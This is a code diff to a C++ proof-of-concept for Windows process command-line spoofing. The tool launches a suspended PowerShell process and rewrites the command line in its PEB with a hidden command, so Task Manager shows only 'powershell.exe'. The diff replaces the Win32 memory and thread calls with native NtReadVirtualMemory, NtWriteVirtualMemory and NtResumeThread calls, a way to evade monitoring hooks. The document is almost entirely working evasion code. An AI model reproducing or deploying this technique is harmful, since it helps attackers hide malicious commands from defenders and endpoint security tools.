@@ -7,6 +7,28 @@
 
 #pragma comment(lib, "ntdll.lib")
 
+// Native API function prototypes
+extern "C" NTSTATUS NtReadVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToRead,
+    PULONG NumberOfBytesRead
+);
+
+extern "C" NTSTATUS NtWriteVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToWrite,
+    PULONG NumberOfBytesWritten
+);
+
+extern "C" NTSTATUS NtResumeThread(
+    HANDLE ThreadHandle,
+    PULONG SuspendCount
+);
+
 // Custom PEB structure to match C# exactly
 struct CUSTOM_PEB {
     BYTE Filler[16];
@@ -54,7 +76,7 @@ int main() {
     // The malicious command (exactly as in C#)
     std::wstring maliciousCommand = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
 
-    
+
     // The command to spoof (exactly as in C#)
     std::wstring spoofedCommand = PadRight(L"powershell.exe", maliciousCommand.length(), L' ');
 
@@ -127,15 +149,15 @@ int main() {
     Debug(L"[+] Reading PEB structure...");
     CUSTOM_PEB peb = { 0 };
     SIZE_T bytesRead = 0;
-    BOOL readResult = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);
-    
-    if (!readResult) {
-        Debug(L"[!] Failed to read PEB structure! Error: " + std::to_wstring(GetLastError()));
+    status = NtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), (PULONG)&bytesRead);
+
+    if (status != 0) {
+        Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(status));
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return 1;
     }
-    
+
     Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
     std::wstringstream ss2;
     ss2 << std::hex << peb.ProcessParameters;
@@ -144,19 +166,19 @@ int main() {
     // Read the ProcessParameters structure, so we can get the CmdLine address
     Debug(L"[+] Reading ProcessParameters structure...");
     CUSTOM_RTL_USER_PROCESS_PARAMETERS procParams = { 0 };
-    readResult = ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), &bytesRead);
-    
-    if (!readResult) {
-        Debug(L"[!] Failed to read ProcessParameters structure! Error: " + std::to_wstring(GetLastError()));
+    status = NtReadVirtualMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), (PULONG)&bytesRead);
+
+    if (status != 0) {
+        Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(status));
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return 1;
     }
-    
+
     Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
     Debug(L"[+] CommandLine Length: " + std::to_wstring(procParams.Length));
     Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(procParams.MaximumLength));
-    
+
     std::wstringstream ss3;
     ss3 << std::hex << procParams.CommandLine;
     Debug(L"[+] CommandLine Address: 0x" + ss3.str());
@@ -164,15 +186,15 @@ int main() {
     // Read the CommandLine address
     Debug(L"[+] Reading original command line...");
     std::vector<wchar_t> cmdLineBuffer(procParams.Length / sizeof(wchar_t));
-    readResult = ReadProcessMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, &bytesRead);
-    
-    if (!readResult) {
-        Debug(L"[!] Failed to read command line! Error: " + std::to_wstring(GetLastError()));
+    status = NtReadVirtualMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, (PULONG)&bytesRead);
+
+    if (status != 0) {
+        Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(status));
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return 1;
     }
-    
+
     std::wstring cmdLine(cmdLineBuffer.data());
     Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(bytesRead));
     Debug(L"[+] Original CommandLine: " + cmdLine);
@@ -182,17 +204,17 @@ int main() {
     std::vector<wchar_t> newCmdLine(maliciousCommand.begin(), maliciousCommand.end());
     Debug(L"[+] New command line length: " + std::to_wstring(newCmdLine.size()));
     Debug(L"[+] New command line size in bytes: " + std::to_wstring(newCmdLine.size() * sizeof(wchar_t)));
-    
+
     SIZE_T bytesWritten = 0;
-    BOOL writeResult = WriteProcessMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), &bytesWritten);
-    
-    if (!writeResult) {
-        Debug(L"[!] Failed to write malicious command! Error: " + std::to_wstring(GetLastError()));
+    status = NtWriteVirtualMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), (PULONG)&bytesWritten);
+
+    if (status != 0) {
+        Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(status));
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return 1;
     }
-    
+
     Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(bytesWritten));
 
     // We also need to write the spoofed command length as ushort to peb.ProcessParameters + 112 bytes
@@ -200,20 +222,20 @@ int main() {
     Debug(L"[+] Writing spoofed command length...");
     USHORT cmdLineLength = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
     Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(cmdLineLength));
-    
+
     std::wstringstream addrStream;
     addrStream << std::hex << (ULONG_PTR)((BYTE*)peb.ProcessParameters + 112);
     Debug(L"[+] Writing to address: 0x" + addrStream.str());
-    
-    writeResult = WriteProcessMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), &bytesWritten);
-    
-    if (!writeResult) {
-        Debug(L"[!] Failed to write spoofed command length! Error: " + std::to_wstring(GetLastError()));
+
+    status = NtWriteVirtualMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), (PULONG)&bytesWritten);
+
+    if (status != 0) {
+        Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(status));
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return 1;
     }
-    
+
     Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(bytesWritten));
     Debug(L"[+] SPOOFING COMPLETE!");
     Debug(L"[+] Process will now show as: powershell.exe");
@@ -221,10 +243,16 @@ int main() {
 
     // Resume the process
     Debug(L"[+] Resuming suspended process...");
-    DWORD resumeResult = ResumeThread(pi.hThread);
-    Debug(L"[+] ResumeThread result: " + std::to_wstring(resumeResult));
+    ULONG suspendCount = 0;
+    status = NtResumeThread(pi.hThread, &suspendCount);
 
-    Debug(L"[+] Process resumed successfully!");
+    if (status == 0) {
+        Debug(L"[+] Process resumed successfully!");
+        Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(status));
+        Debug(L"[+] Previous suspend count: " + std::to_wstring(suspendCount));
+    } else {
+        Debug(L"[!] Failed to resume process! NTSTATUS: 0x" + std::to_wstring(status));
+    }
     Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
     Debug(L"Press a key to end PoC...");
     std::wcin.get();
